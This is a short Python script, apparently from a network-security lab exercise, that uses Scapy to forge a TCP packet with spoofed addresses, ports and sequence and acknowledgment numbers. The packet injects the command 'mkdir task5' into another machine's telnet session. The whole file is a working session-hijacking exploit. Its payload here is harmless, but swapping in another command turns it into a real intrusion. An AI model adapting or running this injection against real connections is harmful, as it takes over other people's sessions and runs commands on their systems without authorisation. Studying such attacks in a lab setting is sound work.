#!/usr/bin/python
from scapy.all import *

ip = IP(src="10.0.1.117", dst="10.0.1.112")
# ports pulled from "netstat -na"
tcp = TCP(sport=33948, dport=23, flags=["P", "A"], seq=3142092644, ack=3490882441)
data = "mkdir task5\r\n"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)